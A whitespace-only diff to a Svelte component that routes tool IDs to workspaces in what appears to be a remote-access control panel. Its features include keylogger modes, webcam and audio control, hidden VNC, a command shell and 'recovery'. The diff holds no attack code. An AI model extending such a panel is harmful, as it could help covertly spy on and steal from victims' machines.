@@ -2,8 +2,8 @@
 	import { browser } from '$app/environment';
 	import { goto } from '$app/navigation';
 	import { resolve } from '$app/paths';
-        import { createEventDispatcher, onMount } from 'svelte';
-        import type { ComponentType } from 'svelte';
+	import { createEventDispatcher, onMount } from 'svelte';
+	import type { ComponentType } from 'svelte';
 	import * as Dialog from '$lib/components/ui/dialog/index.js';
 	import MovableWindow from '$lib/components/ui/movablewindow/MovableWindow.svelte';
 	import { Button } from '$lib/components/ui/button/index.js';
@@ -38,9 +38,9 @@
 	import StartupManagerWorkspace from '$lib/components/workspace/tools/startup-manager-workspace.svelte';
 	import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
 	import TcpConnectionsWorkspace from '$lib/components/workspace/tools/tcp-connections-workspace.svelte';
-        import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
-        import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop/remote-desktop-workspace.svelte';
-        import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
+	import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
+	import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop/remote-desktop-workspace.svelte';
+	import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
 	import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
 	import ReportWindowWorkspace from '$lib/components/workspace/tools/report-window-workspace.svelte';
 	import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
@@ -83,25 +83,25 @@
 	const tool = getClientTool(toolId);
 	const workspaceUrl = buildClientToolUrl(client.id, tool);
 
-        const workspaceComponentMap = {
-                'app-vnc': AppVncWorkspace,
-                'remote-desktop': RemoteDesktopWorkspace,
-                'webcam-control': WebcamControlWorkspace,
-                'audio-control': AudioControlWorkspace,
-                cmd: CmdWorkspace,
-                'file-manager': FileManagerWorkspace,
-                'task-manager': TaskManagerWorkspace,
-                'registry-manager': RegistryManagerWorkspace,
-                'startup-manager': StartupManagerWorkspace,
-                'clipboard-manager': ClipboardManagerWorkspace,
-                'tcp-connections': TcpConnectionsWorkspace,
-                recovery: RecoveryWorkspace,
-                options: OptionsWorkspace,
-                'client-chat': ClientChatWorkspace,
-                'report-window': ReportWindowWorkspace,
-                'ip-geolocation': IpGeolocationWorkspace,
-                'environment-variables': EnvironmentVariablesWorkspace
-        } satisfies Partial<Record<DialogToolId, ComponentType>>;
+	const workspaceComponentMap = {
+		'app-vnc': AppVncWorkspace,
+		'remote-desktop': RemoteDesktopWorkspace,
+		'webcam-control': WebcamControlWorkspace,
+		'audio-control': AudioControlWorkspace,
+		cmd: CmdWorkspace,
+		'file-manager': FileManagerWorkspace,
+		'task-manager': TaskManagerWorkspace,
+		'registry-manager': RegistryManagerWorkspace,
+		'startup-manager': StartupManagerWorkspace,
+		'clipboard-manager': ClipboardManagerWorkspace,
+		'tcp-connections': TcpConnectionsWorkspace,
+		recovery: RecoveryWorkspace,
+		options: OptionsWorkspace,
+		'client-chat': ClientChatWorkspace,
+		'report-window': ReportWindowWorkspace,
+		'ip-geolocation': IpGeolocationWorkspace,
+		'environment-variables': EnvironmentVariablesWorkspace
+	} satisfies Partial<Record<DialogToolId, ComponentType>>;
 
 	const keyloggerModes = {
 		'keylogger-online': 'online',
@@ -134,10 +134,10 @@
 
 	const workspaceRequiresAgent = new Set<DialogToolId>(['cmd']);
 
-        const activeWorkspace = $derived(() => {
-                const key = toolId as keyof typeof workspaceComponentMap;
-                return workspaceComponentMap[key] ?? null;
-        });
+	const activeWorkspace = $derived(() => {
+		const key = toolId as keyof typeof workspaceComponentMap;
+		return workspaceComponentMap[key] ?? null;
+	});
 	const keyloggerMode = $derived(keyloggerModes[toolId as keyof typeof keyloggerModes]);
 	const isWorkspaceDialog = $derived(workspaceToolIds.has(toolId));
 	const missingAgent = $derived(workspaceRequiresAgent.has(toolId) && !agent);
